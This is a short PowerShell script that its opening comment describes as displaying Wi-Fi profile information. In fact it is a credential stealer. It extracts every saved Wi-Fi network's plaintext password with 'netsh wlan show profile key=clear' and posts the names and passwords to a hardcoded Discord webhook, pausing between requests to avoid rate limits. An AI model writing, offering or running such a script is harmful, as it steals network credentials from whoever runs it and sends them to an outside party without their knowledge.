# PowerShell script to retrieve and display Wi-Fi profile information for all networks

# Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1207091234233917531/BWDZRfw1D1u-384nkTsF1ZBeWHfz97bEb81erdnjUg-y8QMAwlL6iKbPO1Xd8AAMP1IY"

# Get all Wi-Fi profiles
$wifiProfiles = netsh wlan show profiles | Out-String

# Process each line to capture profile names
$wifiProfiles -split '\r?\n' | ForEach-Object {
    # Check if the line contains a Wi-Fi profile name
    if ($_ -match ':\s*(.+)') {
        $profileName = $matches[1]
        $passwordInfo = netsh wlan show profile name="$profileName" key=clear

        # Build the message to write to the file
        $outputMessage = @"
Profile Name: $profileName
Password Info: $passwordInfo
"@

        # Check if password information is found
        if ($passwordInfo -match 'Key Content\s*:\s*(.+)') {
            $password = $matches[1].Trim()
            $outputMessage += "Password: $password`n"
        } else {
            $outputMessage += "Password information not found.`n"
        }

        # Send the message to Discord with a delay to avoid rate limits
        Start-Sleep -Seconds 2  # Adjust the delay as needed
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body @{
            content = $outputMessage
        }
    }
}




